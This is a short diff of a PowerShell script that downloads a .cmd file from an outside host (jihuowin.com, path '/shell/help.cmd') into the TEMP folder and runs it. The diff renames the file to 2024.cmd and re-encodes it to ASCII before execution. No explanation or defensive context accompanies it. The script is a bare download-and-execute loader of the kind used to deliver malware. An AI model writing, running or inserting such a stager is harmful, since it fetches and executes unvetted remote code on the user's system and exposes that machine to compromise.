@@ -1,5 +1,7 @@
 $seturl = "https://jihuowin.com/shell/help.cmd";
 
-Invoke-WebRequest -Uri $seturl -OutFile "$env:TEMP\tempfile.cmd";
-Start-Process -FilePath "$env:TEMP\tempfile.cmd";
+Invoke-WebRequest -Uri $seturl -OutFile "$Env:temp\2024.cmd";
+$content = Get-Content -Path "$Env:temp\2024.cmd" -Encoding Default;
+Set-Content -Path "$Env:temp\2024.cmd" -Value $content -Encoding ASCII;
+Start-Process -FilePath "$Env:temp\2024.cmd";
 exit;
